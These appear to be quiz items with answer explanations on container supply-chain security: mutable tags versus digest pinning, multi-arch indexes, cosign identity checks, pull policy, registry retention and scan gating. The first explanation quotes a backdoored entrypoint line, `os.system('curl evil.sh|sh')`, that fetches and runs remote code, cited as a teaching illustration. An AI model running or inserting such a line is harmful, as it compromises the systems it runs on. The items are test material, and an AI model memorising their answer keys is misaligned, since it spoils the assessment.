question: Three nodes in one fleet run the same Deployment with `image: registry.internal/app:1.0`. Node A was scheduled Tuesday, node B came up Wednesday when the autoscaler added capacity, and node C rebooted at 02:03 Thursday after a kernel patch and pulled fresh because its disk cache was gone. A bug reproduces on one node in six. What is the most likely explanation, and what would your tooling tell you?
options: The nodes have different kernel or CPU features, so the same bytes behave differently — compare `uname -r` and the node labels
Node C's pull was interrupted and it is running a partially-extracted image; the layer digests on disk will not match the manifest

They are running three different builds. A tag is a mutable pointer in the registry's database, so a re-push between Tuesday and Thursday changes what the identical reference string resolves to — and nothing reports it, because every pod's `APP_VERSION` still says 1.0 and every dashboard aggregates all three
Kubernetes cached the manifest at the first pull, so nodes B and C are running a stale copy of an image that has since been corrected
explanation: This is the misconception the lesson exists to remove: a tag is not a version, it is a name in a mutable key-value table `(repository, tag) -> manifest digest` that anybody with push access can re-point in one database write — no new identifier, no version bump, no audit trail a client can see. The lesson measured exactly this: two pulls of the byte-identical reference `registry.internal/app:1.0` returned `sha256:f29d198c...` and `sha256:2e3da6b0...`, with the second entrypoint carrying `os.system('curl evil.sh|sh')` while still reporting build 8f21c4 — because the attacker wrote that string and nothing in the pull path can contradict it. Option 4 is nearly the opposite of the truth: pulls are cached by *content*, so a cached layer is always valid. The benign version of this failure is a careless colleague; the hostile version is a leaked CI token, and both are the same one-line write. Pulling by tag is trust-on-every-pull, forever, on every reboot and every autoscale event.

question: You are pinning images by digest for the first time. `crane digest registry.internal/app:1.1` on your amd64 CI runner prints `sha256:021ff5d9dff0...`, so you write that into the Deployment. Everything works for months. Then the platform team adds an arm64 node pool and pods scheduled there fail to start. What went wrong?
options: arm64 nodes need `imagePullPolicy: Always` because the digest is recomputed locally with a different compression setting

You pinned a platform-specific manifest instead of the image index. The tag pointed at an index (`sha256:f0f8e9b7712b`) listing one manifest per platform — `sha256:021ff5d9dff0` for linux/amd64 and `sha256:6903a610c98a` for linux/arm64 — so pinning the amd64 manifest silently pinned your architecture too
Digests are registry-specific, so a digest resolved against one registry endpoint is not valid on nodes that use a pull-through cache
The arm64 image was never built; the index only ever contained one platform and the failure is a missing build, not a pinning mistake
explanation: A tag does not have to point at an image — it can point at an image index (OCI's name; Docker calls it a manifest list), a small JSON document listing one manifest per `os`/`architecture` pair. The client picks the entry matching the machine it runs on, which is why `latest` on an Apple Silicon laptop and `latest` on an x86 cluster can legitimately be different bytes with nobody at fault. Pin the **index** digest, not a platform's. Option 3 is the plausible-sounding wrong answer and the reverse is true: a digest is a content address, valid against any registry or mirror holding those bytes — that is exactly what makes a pull-through cache safe. Note how cheap the second architecture was here: only the base OS and the interpreter are arch-specific, so the arm64 variant added 73.0 MiB rather than another 84.0 MiB, because the pure-Python wheels and the application code are shared blobs.

question: Your CI runs `cosign verify registry.internal/app@${DIGEST}` after every build and the step passes. A colleague says the supply chain is now covered: only signed images reach production. What is the gap?
options: Verification must run at admission time, not in CI — but beyond that the check itself is complete, since a valid signature can only come from your pipeline
The signature covers the manifest but not the layer blobs, so an attacker can substitute a layer without invalidating it

`cosign verify` with no `--certificate-identity-regexp` and `--certificate-oidc-issuer` only proves that *somebody* signed it. Anyone can sign anything. The two identity flags are the actual trust decision: this artifact was signed by a workflow in this repository, authenticated by this issuer
Keyless signing produces certificates valid for about ten minutes, so a verification run more than ten minutes after the build will fail and the passing step means the check is being skipped
explanation: Verifying a signature without pinning the identity answers 'is this signed?' rather than 'is this ours?', and the first question has no security content — signing is free and open to everyone. `--certificate-identity-regexp '^https://github\.com/acme/app/\.github/workflows/.+'` plus `--certificate-oidc-issuer https://token.actions.githubusercontent.com` is where the trust actually lives. The lesson separates two failures that both return False: a valid signature transplanted onto the backdoored manifest `sha256:2e3da6b042ac` fails because the digest is part of what was signed, and a cryptographically *valid* HMAC made with the rotated `release-2025-q4` key also fails because trust is a policy question, not a maths question. Option 4 misreads keyless signing: the certificate is short-lived so there is no long-lived key to steal, but the signature and certificate are published to a public append-only transparency log, so verification checks that the signature was made while the certificate was valid — years later, by anyone.

question: Your Deployments now reference images by digest. A reviewer objects to `imagePullPolicy: IfNotPresent`, arguing that a node could serve a stale or tampered cached layer and that `Always` is the safe choice. How should you answer?
options: They are right for a different reason: `Always` is required because a digest reference does not include the registry hostname, so `IfNotPresent` can match a same-named image from another registry
They are right — `IfNotPresent` skips the registry round-trip and therefore skips digest verification, which is why Kubernetes defaults `:latest` to `Always`
Split the difference: use `Always` in production for the audit trail of a registry pull per pod start, and `IfNotPresent` elsewhere

With a digest, `IfNotPresent` is not merely safe but strictly correct: a cached blob whose sha256 matches the requested digest *is* the requested content, by definition, and the content address can never go stale. `Always` exists to work around mutable tags — which is why Kubernetes special-cases `:latest` to default to `Always` — and it puts a registry round-trip in the recovery path of every pod start
explanation: Content addressing means the storage key is the hash of the value, which buys integrity, deduplication and always-correct caching from one mechanism. Integrity is not theoretical: flipping a single bit in a 421,888-byte layer (byte 169,781, 0x3e to 0x3f) changed 58 of the 64 hex digits of the digest, so an unverified read returns 421,888 bytes and no error while a verified read rejects it. The same property is why ten releases of one service occupy 99.6 MiB instead of 839.3 MiB — an 88.1% saving from 26 dedup hits across 60 blob puts, with nothing compressed. The operational point behind the correct answer matters at 03:00: `Always` makes the registry a hard dependency of every pod start, so a registry outage or a `TOOMANYREQUESTS` rate limit stops you recovering from an unrelated incident. The default is in fact `IfNotPresent` for everything except a `:latest` tag, and that exception tells you what Kubernetes thinks of mutable tags.

question: Your Deployment pins `app@sha256:f0f8e9b...`, and the registry has a lifecycle policy expiring untagged images after 14 days to control the storage bill. Six weeks after a release, an incident requires rolling back to it. What happens, and what is the right lifecycle rule?
options: The rollback silently resolves to the nearest surviving image, so it appears to succeed while running the wrong artifact

The pull fails with `MANIFEST_UNKNOWN` and the rollback stops — which is the pinned path failing closed as designed. Fix the policy, not the pinning: keep the last N tagged releases indefinitely, exempt anything currently referenced by a running workload, expire only untagged images, and confirm the rollback window is shorter than the retention window before enabling it
Nothing — the manifest is retained because the Deployment still references it, and registries do not expire referenced digests
The pull succeeds from a node's local cache if any node still has the layers, so the rollback works on some nodes and fails on others, producing a split fleet
explanation: This is the property that makes pinning safe to depend on rather than merely different: a pin either returns the exact bytes or it fails. It never quietly resolves to something else — option 1 describes a tag's failure mode, which is success with the wrong content, the worst failure mode a system can have. Option 3 states a comforting untruth: ECR, GAR and ACR have no idea what your cluster is running, they charge per GB-month and they expire on age or count. And option 4 is worth ruling out explicitly: a cached layer on one node is not a manifest, and a scale-up onto a fresh node still needs the registry. The general rule is that your retention window must exceed your rollback window, and that is a number you should be able to state — if you cannot roll back to a six-week-old release, say so deliberately rather than discovering it during an incident.

question: Your pipeline gates on 'no MEDIUM or above findings'. The current release scans clean except for one MEDIUM in `perl-base`, which sits in the base image, is never loaded by your application, and has an empty `fixed_in` because no upstream patch exists. Releases are now blocked. What is the correct response?
options: Rebuild on a distroless base to remove `perl-base`, then keep the gate as it is — the count is the metric that matters and it should reach zero
Suppress the finding in the scanner's config so the pipeline goes green, and revisit when an upstream fix appears

Change what you gate on. Block on findings that are *reachable* and *fixable* above a severity; require a named, expiring exception for everything else; and track the age of your oldest unpatched base image as the number that actually correlates with risk. 'Zero criticals' is a statement about what you chose to count, not about whether you can be attacked
Lower the gate to 'no HIGH or above', which unblocks this release and keeps a meaningful bar
explanation: The false-positive problem is structural, not a scanner bug: a scanner reads your SBOM, not your call graph, so an XML parser your service never invokes is a finding with the same severity as the TLS library you use on every request. The lesson measured both halves — `app:1.0` had 5 findings of which 2 were in packages the image actually loads, and after the upgrade `app:1.1` had 1 finding and 0 reachable — and both statements are true while only one is about risk. Option 1 is the tempting engineering answer and is often a genuinely good idea, but as a *response to the gate* it treats an unfalsifiable metric as a goal; you will meet the same wall on the next unfixable base-image finding. Option 4 just moves the arbitrary line. Option 2 is what teams actually do under deadline pressure, and it is how suppression lists grow until they match everything — if you suppress, do it as a named, dated, expiring exception, and note that VEX exists precisely to publish 'we ship this and it is not exploitable in our configuration' as a machine-readable statement rather than a comment in a spreadsheet.
